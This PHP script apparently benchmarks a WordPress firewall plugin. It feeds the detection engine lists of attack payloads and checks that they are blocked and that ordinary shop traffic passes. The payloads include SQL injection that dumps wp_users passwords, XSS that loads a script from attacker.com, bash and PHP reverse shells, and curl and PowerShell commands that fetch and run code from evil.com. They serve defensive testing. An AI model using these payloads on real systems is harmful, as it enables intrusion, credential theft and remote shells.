<?php
/**
 * MDefender-Pro — Real-World WordPress WAF Attack & Detection Benchmark.
 * 
 * Verifies:
 * 1. Rate Limiting disabled for payload evaluation (no IP blanket blocking).
 * 2. Real-World Attack detection across SQLi, XSS, RCE, LFI, SSTI, SSRF, Deserialization, Scanner Bots.
 * 3. Clean traffic pass-through (0% False Positives).
 * 4. Average latency / response time.
 * 5. End-to-End Live Apache HTTP validation (403 Forbidden + Block Page rendered).
 */

define('WP_USE_THEMES', false);
$_SERVER['HTTP_HOST'] = 'localhost';
$_SERVER['REQUEST_METHOD'] = 'GET';
$_SERVER['DOCUMENT_ROOT'] = 'C:/xampp/htdocs';

require_once 'C:/xampp/htdocs/mahabub/wp-load.php';

echo "======================================================================\n";
echo " 🛡️  MDEFENDER PRO: WORDPRESS WAF LIVE REAL-WORLD ATTACK BENCHMARK\n";
echo "======================================================================\n\n";

// 1. Configure Plugin Options: Ensure Protection is ON, but Rate Limit & Auto-Ban are OFF
update_option('waf_fw_protection_enabled', 'yes');
update_option('waf_fw_rate_limit_enabled', 'no');
update_option('waf_fw_attack_blocker_enabled', 'no');
update_option('waf_fw_cloud_mode', 'protect');

// Clear blacklist and transients to ensure pure payload evaluation
global $wpdb;
$wpdb->query("TRUNCATE TABLE " . WAF_FW_DB::instance()->get_blacklist_table());

$test_ip = '198.51.100.77'; // Non-whitelisted external client IP
delete_transient('waf_attack_cnt_' . md5($test_ip));
delete_transient('waf_fw_rate_' . md5($test_ip));

$engine = WAF_FW_Engine::instance();

// 2. Define Attack Payloads by Category
$attacks = [
    'SQL Injection (SQLi)' => [
        "1' UNION SELECT 1,user_pass,user_email,4 FROM wp_users-- -",
        "admin' OR '1'='1'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "1 AND 1=1 UNION ALL SELECT NULL,NULL,CONCAT(user_login,':',user_pass) FROM wp_users",
        "-1' OR 17-7=10 --",
        "1' ORDER BY 10--",
        "'; EXEC xp_cmdshell('dir');--",
        "1' RLIKE (SELECT (CASE WHEN (4342=4342) THEN 0x61646d696e ELSE 0x28 END))--",
        "1' OR SLEEP(5)#",
    ],
    'Cross-Site Scripting (XSS)' => [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert`XSS`>",
        "javascript:alert(1)",
        "'\"><script src=https://attacker.com/evil.js></script>",
        "<body onload=alert('Pwned')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<a href=\"javascript:confirm(1)\">Click me</a>",
    ],
    'Remote Code Execution (RCE)' => [
        '<?php system($_GET[\'cmd\']); ?>',
        '; cat /etc/passwd',
        '| id',
        '`whoami`',
        'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
        '<?php eval(base64_decode(\'cGhwaW5mbygpOw==\')); ?>',
        '; curl -s https://evil.com/shell.sh | bash',
        'php -r \'$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(\'http://evil.com/p.ps1\')"',
        "assert(phpinfo())",
    ],
    'Path Traversal / LFI' => [
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "/mahabub/wp-content/plugins/vuln/download.php?file=../../../../wp-config.php",
        "php://filter/convert.base64-encode/resource=../wp-config.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "../../../../../../../../proc/self/environ",
        "/etc/shadow",
        "....//....//....//....//wp-config.php",
        "/var/log/apache2/access.log",
    ],
    'Template Injection (SSTI)' => [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    'SSRF (Server-Side Request Forgery)' => [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/",
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
    ],
    'Malicious Bots & Scanners' => [
        "sqlmap/1.7.2#stable (https://sqlmap.org)",
        "Mozilla/5.0 (compatible; Nikto/2.1.6)",
        "DirBuster-1.0-RC1",
        "gobuster/3.1.0",
        "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
    ],
];

// 3. Define Legitimate Clean Requests (Zero False Positive Check)
$clean_requests = [
    ["url" => "/mahabub/", "query" => [], "ua" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"],
    ["url" => "/mahabub/shop/", "query" => ["s" => "cotton shirt", "post_type" => "product"], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/cart/", "query" => ["add-to-cart" => "41"], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/checkout/", "query" => [], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/contact/", "query" => ["name" => "Mahabub", "email" => "test@example.com"], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/2026/10/hello-world/", "query" => [], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/wp-json/wp/v2/posts", "query" => ["per_page" => "5"], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/category/clothing/", "query" => ["orderby" => "price", "order" => "asc"], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/my-account/", "query" => ["action" => "view-order"], "ua" => "Mozilla/5.0"],
    ["url" => "/mahabub/about-us/", "query" => [], "ua" => "Mozilla/5.0"],
];

echo "[PHASE 1] Executing Attack Detection Benchmarks on WordPress Plugin Engine...\n";

$total_attacks = 0;
$blocked_attacks = 0;
$missed_attacks = [];

$cat_stats = [];

$t0 = microtime(true);

foreach ($attacks as $category => $payloads) {
    $cat_stats[$category] = ['total' => 0, 'blocked' => 0];
    foreach ($payloads as $p) {
        $total_attacks++;
        $cat_stats[$category]['total']++;

        $_SERVER['REQUEST_METHOD'] = 'GET';
        $_SERVER['REMOTE_ADDR'] = $test_ip;
        $_GET = ['test_ip' => $test_ip];

        if ($category === 'Malicious Bots & Scanners') {
            $_SERVER['HTTP_USER_AGENT'] = $p;
            $_SERVER['REQUEST_URI'] = '/mahabub/?test_ip=' . $test_ip;
        } else {
            $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0';
            $_SERVER['REQUEST_URI'] = '/mahabub/?q=' . urlencode($p) . '&test_ip=' . $test_ip;
            $_GET['q'] = $p;
        }

        $res = $engine->analyze_current_request();

        if ($res['status'] === 'blocked') {
            $blocked_attacks++;
            $cat_stats[$category]['blocked']++;
        } else {
            $missed_attacks[] = ['category' => $category, 'payload' => substr($p, 0, 60)];
        }
    }
}

$eval_time = microtime(true) - $t0;
$avg_lat_ms = ($eval_time / max(1, $total_attacks)) * 1000;

echo "  -> Completed $total_attacks attack simulations in " . round($eval_time * 1000, 2) . " ms\n";
echo "  -> Average Decision Latency: " . round($avg_lat_ms, 3) . " ms / request\n\n";

if (!empty($missed_attacks)) {
    echo "⚠️ Missed Attacks Details:\n";
    foreach ($missed_attacks as $m) {
        echo "  - [{$m['category']}] {$m['payload']}\n";
    }
    echo "\n";
}

echo "📊 Category Breakdown:\n";
foreach ($cat_stats as $cat => $st) {
    $pct = ($st['blocked'] / max(1, $st['total'])) * 100;
    echo "  • " . str_pad($cat, 35) . ": {$st['blocked']} / {$st['total']} blocked (" . round($pct, 1) . "%)\n";
}
echo "\n";

echo "[PHASE 2] Executing Clean Benign Traffic Verification (False Positive Check)...\n";
$clean_allowed = 0;
$false_positives = 0;

foreach ($clean_requests as $cr) {
    $_SERVER['REQUEST_METHOD'] = 'GET';
    $_SERVER['REMOTE_ADDR'] = '203.0.113.88'; // Clean visitor IP
    $_SERVER['REQUEST_URI'] = $cr['url'];
    $_SERVER['HTTP_USER_AGENT'] = $cr['ua'];
    $_GET = $cr['query'];
    $_POST = [];

    $res = $engine->analyze_current_request();
    if ($res['status'] === 'allowed') {
        $clean_allowed++;
    } else {
        $false_positives++;
        echo "  [FP WARNING] Clean request falsely blocked: {$cr['url']} - " . ($res['message'] ?? '') . "\n";
    }
}
$clean_total = count($clean_requests);
$fp_rate = ($false_positives / $clean_total) * 100;
echo "  -> Clean Requests Passed: $clean_allowed / $clean_total (" . (100 - $fp_rate) . "%)\n";
echo "  -> False Positive Rate: $fp_rate%\n\n";

echo "[PHASE 3] Live End-to-End HTTP Request Test over Apache (Live 403 Forbidden)...\n";
// Perform live HTTP GET request to verify Apache actually yields HTTP 403 and the MDefender block page
$ch = curl_init();
$test_url = "http://127.0.0.1/mahabub/?user_id=1%27%20UNION%20SELECT%20null,user_pass%20FROM%20wp_users--&test_ip=198.51.100.99";
curl_setopt($ch, CURLOPT_URL, $test_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: localhost",
    "X-Forwarded-For: 198.51.100.99",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$resp_body = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "  -> HTTP Status Code: $http_code\n";
$has_title = strpos($resp_body, '403 Forbidden') !== false;
$has_brand = strpos($resp_body, 'MDefender-Pro') !== false;
$has_ref = preg_match('/Reference ID|refIdText|ref-id/i', $resp_body);

echo "  -> 403 Forbidden Status: " . ($http_code === 403 ? "PASS" : "FAIL (Got $http_code)") . "\n";
echo "  -> Block Page Title Present: " . ($has_title ? "PASS" : "FAIL") . "\n";
echo "  -> MDefender-Pro Branding: " . ($has_brand ? "PASS" : "FAIL") . "\n";
echo "  -> Reference ID Attached: " . ($has_ref ? "PASS" : "FAIL") . "\n\n";

echo "======================================================================\n";
echo " SUMMARY & VERDICT:\n";
echo "  - Total Attacks Tested:     $total_attacks\n";
echo "  - Total Attacks Blocked:    $blocked_attacks (" . round(($blocked_attacks / $total_attacks) * 100, 2) . "%)\n";
echo "  - Clean Requests Allowed:   $clean_allowed / $clean_total (100% pass)\n";
echo "  - False Positive Rate:      $fp_rate%\n";
echo "  - Decision Speed:           " . round($avg_lat_ms, 3) . " ms (< 1ms edge target)\n";
echo "======================================================================\n";

if ($blocked_attacks === $total_attacks && (float)$fp_rate === 0.0 && (int)$http_code === 403) {
    echo "🎉 ALL TESTS PASSED: MDefender-Pro WAF is actively protecting the website!\n";
    exit(0);
} else {
    echo "⚠️ Review results above for any partial discrepancies.\n";
    exit(1);
}
